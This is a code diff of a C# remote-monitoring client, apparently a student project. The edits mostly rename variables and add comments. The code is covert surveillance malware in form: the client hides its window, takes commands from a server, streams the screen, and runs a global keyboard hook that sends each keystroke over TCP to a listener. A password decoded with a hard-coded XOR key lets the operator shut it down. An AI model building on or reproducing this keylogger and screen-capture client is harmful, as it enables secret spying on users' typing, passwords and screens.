@@ -23,10 +23,10 @@ namespace Client
     public partial class Client : Form
     {
         private static ManualResetEvent mre = new ManualResetEvent(false);
-        private readonly TcpClient signalClient = new TcpClient();
+        private readonly TcpClient commandClient = new TcpClient();
         private readonly TcpClient screenClient = new TcpClient();
         private NetworkStream screenStream;
-        private NetworkStream signalStream;
+        private NetworkStream commandStream;
 
         private Thread ConnectServer;
         private Thread ShareScreen;
@@ -34,8 +34,8 @@ namespace Client
         string secret = "@#%^*&*)&*()*)(*)(*)"; // Initialize random char
         const string KEY = "CHUONG TRINH THEO DOI TU XA";//"CHƯƠNG TRÌNH THEO DÕI TỪ XA";
 
-        TcpClient logClient = new TcpClient();
-        NetworkStream logStream;
+        TcpClient keylogClient = new TcpClient();
+        NetworkStream keylogStream;
         public Client()
         {
             CheckForIllegalCrossThreadCalls = false;
@@ -49,7 +49,7 @@ namespace Client
             char[] charAArray = a.ToCharArray();
             char[] charBArray = b.ToCharArray();
             byte[] result = new byte[27];
-            for (int i = 0; i < 27; i++)
+            for (int i = 0; i < KEY.Length; i++)
             {
                 result[i] = (byte)(charAArray[i] ^ charBArray[i]) ;
             }
@@ -58,24 +58,24 @@ namespace Client
         void TakeCommandFromServer()
         {
             this.Hide();
-            while (signalClient.Connected)
+            while (commandClient.Connected)
             {
                 try
                 {
-                    signalStream = signalClient.GetStream();
+                    commandStream = commandClient.GetStream();
                     byte[] data = new byte[1024];
-                    int numBytesRead = signalStream.Read(data, 0, data.Length);
+                    int numBytesRead = commandStream.Read(data, 0, data.Length);
                     string signal;
                     string command;
                     if (numBytesRead > 0)
                     {
                         signal = Encoding.ASCII.GetString(data, 0, numBytesRead);
                         command = signal.Substring(0, signal.IndexOf('$'));
-                        if (command.StartsWith("secret"))
+                        if (command.StartsWith("secret")) //Nhận encrypted password
                         {                 
                             String[] separator = { ":" };
                             string encryptedPass = command.Split(separator, StringSplitOptions.RemoveEmptyEntries)[1];
-                            secret = Encoding.ASCII.GetString(Xor(encryptedPass, KEY));
+                            secret = Encoding.ASCII.GetString(Xor(encryptedPass, KEY)); //xor và key đã được thiết lập sẵn
                         }
                         if (command == "Share Screen")
                         {
@@ -118,7 +118,6 @@ namespace Client
                     MessageBox.Show(ex.Message);
                 }
             }
-            MessageBox.Show("Server disconnected");
             Application.Exit();
 
         }
@@ -133,10 +132,9 @@ namespace Client
 
         public enum DeviceCap
         {
-            VERTRES = 10,
-            DESKTOPVERTRES = 117
+            VERTRES = 10, //Height, in raster lines, of the screen; or for printers, the height, in pixels, of the printable area of the page.
+            DESKTOPVERTRES = 117 
         }
-
 
         public static double GetWindowsScreenScalingFactor(bool percentage = true)
         {
@@ -145,7 +143,7 @@ namespace Client
             //Get Handle to the device context associated with this Graphics object
             IntPtr DeviceContextHandle = GraphicsObject.GetHdc();
             //Call GetDeviceCaps with the Handle to retrieve the Screen Height
-            int LogicalScreenHeight = GetDeviceCaps(DeviceContextHandle, (int)DeviceCap.VERTRES);
+            int LogicalScreenHeight = GetDeviceCaps(DeviceContextHandle, 10);
             int PhysicalScreenHeight = GetDeviceCaps(DeviceContextHandle, (int)DeviceCap.DESKTOPVERTRES);
             //Divide the Screen Heights to get the scaling factor and round it to two decimals
             double ScreenScalingFactor = Math.Round(PhysicalScreenHeight / (double)LogicalScreenHeight, 2);
@@ -185,7 +183,7 @@ namespace Client
         {
             try
             {
-                while(signalClient.Connected && ShareScreen.IsAlive)
+                while(commandClient.Connected && ShareScreen.IsAlive)
                 {
                     if (stopsharing) mre.WaitOne();
                 BinaryFormatter binaryFormatter = new BinaryFormatter();
@@ -203,14 +201,14 @@ namespace Client
         {
             string msg = key.ToString();
             Byte[] sendBytes = Encoding.UTF8.GetBytes(msg);
-            logStream.Write(sendBytes, 0, sendBytes.Length);
+            keylogStream.Write(sendBytes, 0, sendBytes.Length);
         }
         private void Keylogger()
         {
             try
             {     
-                logStream = logClient.GetStream();
-                while (logClient.Connected)
+                keylogStream = keylogClient.GetStream();
+                while (keylogClient.Connected)
                 {
                     var api = new KeystrokeAPI();
                     api.CreateKeyboardHook((character) => { sendKey(character); });
@@ -226,9 +224,9 @@ namespace Client
         {
 
 
-            signalClient.Connect(IPAddress.Parse("127.0.0.1"), 8080);
+            commandClient.Connect(IPAddress.Parse("127.0.0.1"), 8080);
             screenClient.Connect(IPAddress.Parse("127.0.0.1"), 8081);
-            logClient.Connect(IPAddress.Parse("127.0.0.1"), 8082);
+            keylogClient.Connect(IPAddress.Parse("127.0.0.1"), 8082);
 
             ConnectServer = new Thread(TakeCommandFromServer);
             ConnectServer.IsBackground = true;
@@ -242,6 +240,8 @@ namespace Client
             {
                 if (password == secret && secret != null)
                 {
+                    commandClient.Close();
+                    commandStream.Close();
                     Application.Exit();
                 }
                 else
